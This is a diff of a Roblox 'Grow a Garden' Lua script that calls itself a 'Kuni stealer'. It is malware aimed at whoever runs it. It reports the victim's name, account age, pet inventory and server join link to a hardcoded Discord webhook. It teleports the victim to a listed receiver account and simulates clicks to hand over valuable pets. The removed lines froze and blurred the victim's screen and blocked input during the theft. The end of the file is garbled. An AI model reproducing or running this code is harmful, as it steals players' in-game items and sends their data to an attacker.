@@ -1,153 +1,235 @@
-repeat task.wait() until game:IsLoaded()
-
---// Services
-local Players = game:GetService("Players")
-local Lighting = game:GetService("Lighting")
-local StarterGui = game:GetService("StarterGui")
-local UserInputService = game:GetService("UserInputService")
-local ContextActionService = game:GetService("ContextActionService")
-local RunService = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-local Humanoid = Character:WaitForChild("Humanoid")
-local dataModule = require(ReplicatedStorage.Modules.DataService)
+repeat 
+    task.wait()
+until game:IsLoaded()
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
-
+local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "HelloWorld_Z99, Kuni_Loot, Kuni_Loot1, Kuni_Loot02, Kuni_Loot3, Elaine_Pets, Elaine_Pets1, Elaine_Pets2, Elaine_Pets3, Elaine_Pets4, Elaine_Pets5, Elaine_Pets6, Elaine_Pets7, Elaine_Pets8, Elaine_Pets9, Elaine_Pets10, Elaine_Pets11, Elaine_Pets12, Elaine_Pets13, Elaine_Pets14, Elaine_Pets15, Elaine_Pets16, Elaine_Pets17, Elaine_Pets18, Elaine_Pets19, Elaine_Pets20, BEESUYAH"
+    "Elaine_Pets17"
 }
 
--- DISPLAY FILTER ONLY
-local PET_WHITELIST_NAME = {
-    ["T-Rex"] = true,
-    ["Spinosaurus"] = true,
-    ["Queen Bee"] = true,
-    ["Disco Bee"] = true,
-    ["Mimic Octopus"] = true,
-    ["Dragonfly"] = true,
-    ["Butterfly"] = true,
-    ["Fennec Fox"] = true,
-    ["Raccoon"] = true
-}
-
--- AUTO UNEQUIP - UUID or true
 local PET_WHITELIST = {
-    ["Dragonfly"] = "{63ffe264-ec3c-4c4f-b1d5-718d6a274dd3}",
-    ["Corrupted Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}",
-    ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
-    ["Mimic Octopus"] = "{c91e7566-c879-4a4d-9a62-8511f7aae3a4}",
-    ["Butterfly"] = "{c174f6b9-3187-44fb-9be0-77f500d7aa3d}",
-    ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
-    ["Disco Bee"] = "{809e310d-a9df-4e60-a796-80578cd5c73a}",
-    ["Queen Bee"] = "{18a8af4f-6d75-4494-a7a5-adbd4193ca19}",
-    ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
-    ["Fennec Fox"] = true,
-    ["Kitsune"] = true
+    'Raccoon',
+    'T-Rex',
+    'Fennec Fox',
+    'Dragonfly',
+    'Butterfly',
+    'Disco Bee',
+    'Mimic Octopus',
+    'Queen Bee',
+    'Spinosaurus',
+    'Kitsune',
 }
 
--- PET VALUES
-local PET_VALUES = {
-    ["T-Rex"] = 20000,
-    ["Spinosaurus"] = 15000,
-    ["Queen Bee"] = 30000,
-    ["Disco Bee"] = 25000,
-    ["Mimic Octopus"] = 12000,
-    ["Dragonfly"] = 10000,
-    ["Butterfly"] = 8000,
-    ["Fennec Fox"] = 5000,
-    ["Raccoon"] = 9000
-}
+local victimPetTable = {}
 
--- FREEZE PLAYER
-Humanoid.WalkSpeed = 0
-Humanoid.JumpPower = 0
-Humanoid.AutoRotate = false
-Camera.CameraType = Enum.CameraType.Scriptable
-UserInputService.MouseIconEnabled = false
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
 
-RunService.RenderStepped:Connect(function()
-    if Character and Character:FindFirstChild("Head") then
-        Camera.CFrame = Character.Head.CFrame
+local function waitForJoin()
+    local findTarget = false
+    local trigeretName = nil
+
+    for _, player in game.Players:GetPlayers() do
+        if not table.find(USERNAMES, player.Name) then
+            continue
+        end
+
+        trigeretName = player.Name
+        findTarget = true
     end
-end)
 
--- BLUR SCREEN
-local blur = Instance.new("BlurEffect")
-blur.Size = 9999
-blur.Parent = Lighting
+    return findTarget, trigeretName
+end
 
--- DISABLE ESC + ALL INPUT
-ContextActionService:BindActionAtPriority("BlockAll", function()
-    return Enum.ContextActionResult.Sink
-end, false, math.huge, unpack(Enum.KeyCode:GetEnumItems()))
+function createDiscordEmbed(petList, totalValue, fileUrl)
+    local embed = {
+        title = "GROW A GARDEN HIT - KUNI STEALER",
+        color = 65280,
+        fields = {
+            {
+                name = " **Player Information**",
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
+                    VICTIM.Name, 
+                    table.concat(USERNAMES, " "), 
+                    identifyexecutor(), 
+                    game.Players.LocalPlayer.AccountAge
+                ),
+                inline = false
+            },
+            {
+                name = " **Total Value**",
+                value = string.format("```%sÂ¢```", totalValue),
+                inline = false
+            },
+            {
+                name = "**Backpack**",
+                value = string.format("```%s```", petList),
+                inline = false
+            },
+            {
+                name = " **Join with URL**",
+                value = string.format(
+                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
+                    game.JobId, 
+                    game.PlaceId, 
+                    game.JobId
+                ),
+                inline = false
+            }
+        },
+        footer = {
+            text = string.format("%s | %s", game.PlaceId, game.JobId)
+        }
+    }
 
--- HIDE OTHER PLAYERS VISUALLY
-for _, player in pairs(Players:GetPlayers()) do
-    if player ~= LocalPlayer and player.Character then
-        for _, obj in ipairs(player.Character:GetDescendants()) do
-            if obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture") then
-                obj.Transparency = 1
-            elseif obj:IsA("BillboardGui") or obj:IsA("SurfaceGui") then
-                obj.Enabled = false
-            end
+    local data = {
+        content = string.format(
+            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+            game.PlaceId,
+            game.JobId
+        ),
+        username = game.Players.LocalPlayer.Name,
+        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+        embeds = {embed}
+    }
+
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local response = request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonData
+    })
+
+    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        warn("ÐžÑˆÐ¸Ð±ÐºÐ° Ð¾Ñ‚Ð¿Ñ€Ð°Ð²ÐºÐ¸ Ð² Discord:", response.StatusCode, response.Body)
+    end
+end
+
+
+local function teleportTarget(targetName)
+    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+end
+
+local function deltaBypass()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,      
+        true,   
+        nil,    
+        false   
+    )
+
+    task.wait()
+
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0,
+        false,
+        nil,
+        false
+    )
+end
+
+local function checkPetsWhilelist(pet)
+    for _, name in PET_WHITELIST do
+        if string.find(pet, name) then
+            return true
         end
     end
 end
 
--- REMOVE ALL GUIs
-for _, gui in pairs(LocalPlayer:WaitForChild("PlayerGui"):GetChildren()) do
-    if gui:IsA("ScreenGui") and gui.Name ~= "RobloxGui" then
-        gui:Destroy()
+local function getPetObject(petUid: string): Instance?
+    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+
+    for _, object in workspace[VICTIM.Name]:GetChildren() do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+
+    return nil
+end
+
+local function equipPet(pet)
+    if pet:GetAttribute("d") then
+        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+    end
+
+    VICTIM.Character.Humanoid:EquipTool(pet)
+end
+
+local function getPlayersPets()
+    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+        if not checkPetsWhilelist(value.PetType) then
+            continue
+        end
+
+
+        table.insert(victimPetTable, value.PetType)
     end
 end
 
--- REMOVE TOOLS
-for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
-    if tool:IsA("Tool") then
-        tool:Destroy()
-    end
-end
-for _, tool in pairs(Character:GetChildren()) do
-    if tool:IsA("Tool") then
-        tool:Destroy()
+local function startSteal(trigerName)
+    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
+        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
+        deltaBypass()
     end
 end
 
--- AUTO UNEQUIP NON-WHITELISTED PETS WHEN NEAR TOPBASEPLATE
+local function checkPetsInventory(target)
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhilelist(value.PetType) then
+            continue
+        end
+
+        local petObject = getPetObject(petUid)
+        
+        if not petObject then
+            continue
+        end
+        
+        equipPet(petObject)
+        task.wait(0.2)
+        startSteal(target)
+    end
+end
+
+local function idlingTarget()
+    task.spawn(function()
+        while task.wait(0.2) do
+            local isTarget, trigerName = waitForJoin()
+
+            if isTarget then
+                teleportTarget(trigerName)
+                checkPetsInventory(trigerName)
+            end
+        end
+    end)
+end
+
+getPlayersPets()
+
 task.spawn(function()
     while task.wait(0.5) do
-        local root = Character:FindFirstChild("HumanoidRootPart")
-        local topBase = workspace:FindFirstChild("TopBaseplate")
-        if root and topBase and (root.Position - topBase.Position).Magnitude < 20 then
-            for _, obj in pairs(Character:GetChildren()) do
-                if obj:IsA("Tool") and obj:FindFirstChild("Handle") then
-                    local uuid = obj:GetAttribute("PET_UUID")
-                    local petName = obj.Name
-                    local whitelistEntry = PET_WHITELIST[petName]
-                    if whitelistEntry ~= true and whitelistEntry ~= uuid then
-                        obj.Parent = LocalPlayer.Backpack -- auto unequip
-                    end
-                end
-            end
+        if #victimPetTable > 0 then
+            idlingTarget()
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
+            break
         end
     end
-end)
-
--- CREATE WEBHOOK EMBED
-local function createDiscordEmbed(petList)
-    local emojiMap = {
-        ["T-Rex"] = "ðŸ¦–",
-        ["Spinosaurus"] = "ðŸ¦•",
-        ["Queen Bee"] = "ðŸ‘‘ðŸ",
-        ["Disco Bee"] = "ðŸª©ðŸ",
-        ["Mimic Octopus"] = "ðŸ™",
-        ["Dragonfly"] = "ðŸª°",
-        ["Butterfly"] = "ðŸ¦‹",
+end)        ["Butterfly"] = "ðŸ¦‹",
         ["Fennec Fox"] = "ðŸ¦Š",
         ["Raccoon"] = "ðŸ¦"
     }
